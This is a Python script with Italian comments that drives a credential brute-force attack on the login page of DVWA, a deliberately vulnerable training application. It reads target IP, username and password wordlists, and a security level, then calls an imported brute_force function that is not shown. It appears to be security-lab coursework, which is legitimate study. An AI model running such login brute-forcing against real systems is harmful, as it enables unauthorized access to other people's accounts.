### IMPORT MODULI ESTERNI

#import della funzione brute_force e is_valid_ip definita nel modulo chipherlib
from cipherlib import brute_force, is_valid_ip

#import os --> modulo esterno usato per validare il path che verrà inserito per i file contenenti password e username
import os


### DICHIARAZIONE VARIABILI E CHECK INPUT UTENTE

ip_target = ""
path_user = ""
path_password = ""
security_lev = 0

#Input IP target con validazione
while True:
    #input dall'utente per la stringa ip_target
    ip_target = str(input("Inserisci l'indirizzo IP del target:\n"))
    #esce dall'iterazione solo se l'ip è valido (call function is_valid_ip definita in precedenza)
    if (is_valid_ip(ip_target)):
        break

#chiede l'inserimento del path del file con la lista utenti finchè non viene indicato un path di un file
while not os.path.isfile(path_user):
    #input dall'utente per la stringa path_user
    path_user = str(input("Inserisci percorso file usernames:\n"))

#chiede l'inserimento del path del file con la lista password finchè non viene indicato un path di un file
while not os.path.isfile(path_password):
    #input dall'utente per la stringa path_password
    path_password = str(input("Inserisci percorso file passwords:\n"))

#Input security level DVWA
while True:
    try:
        #input dall'utente per il security level valorizzato come intero
        security_lev = int(input("Inserisci il livello di sicurezza per il cookie di DVWA:\n1 - low\n2 - medium\n3 - high\n"))
    except ValueError:
        print("Fai una scelta valida 1,2 o 3! \n")
    if(security_lev == 1 or security_lev == 2 or security_lev == 3):
        break

### CORPO PRINCIPALE DEL CODICE

#definizione e apertura file contenenti password e username
username_file = open(path_user)
password_file = open(path_password)

#popolate le variabili list che conterranno la lista di user e password tramite funzione readlines
user_list_login = username_file.readlines()
pwd_list_login = password_file.readlines()

#dichiarazione stringa che contiene l'eventuale messaggio di errore in caso di login fallita
msg_failed_login = '<div class="message">Login failed</div>'

#chiamata funzione brute_force (ricorsiva) definita nel modulo chipherlib
#prende come parametri:
#   - lista username e password
#   - ip target + context per costruire la url
#   - messaggio di errore login(deve corrispondere a quello della pagina html)
#   - security level per manipolare il cookie security
if(security_lev == 1):
    brute_force(user_list_login, pwd_list_login, ip_target, "/dvwa/login.php", msg_failed_login, "low")
elif(security_lev == 2):
    brute_force(user_list_login, pwd_list_login, ip_target, "/dvwa/login.php", msg_failed_login, "medium")
elif(security_lev == 3):
    brute_force(user_list_login, pwd_list_login, ip_target, "/dvwa/login.php", msg_failed_login, "high")
else:
    print("Security level non valido!\n")